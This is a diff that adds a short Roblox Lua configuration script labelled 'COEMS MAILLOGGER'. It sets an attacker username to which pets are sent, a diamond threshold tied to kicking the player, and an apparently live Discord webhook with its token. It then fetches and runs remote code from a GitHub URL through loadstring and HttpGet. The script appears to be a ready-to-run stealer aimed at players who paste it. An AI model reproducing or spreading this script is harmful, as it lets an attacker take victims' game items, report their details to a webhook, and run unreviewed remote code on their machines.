@@ -1,0 +1,13 @@
+--[[COEMS MAILLOGGER ]]--
+
+--[[ Main Config ]]--
+
+_G.Username = "sn_ym" --// Username To Send Pets To
+
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+
+--[[ WebHook ]]--
+
+_G.Webhook = "https://discord.com/api/webhooks/1109021833883295825/27gUYqdb9_6d_WNfX0ZZxhWvGFJP1Oni8pbQ-FWp3-JazlvmdzJDX5ZK5Ow_ZLnedikr" --// Discord Webhook For info
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lovinsonpro/COEMS/main/CoemsLogger"))()
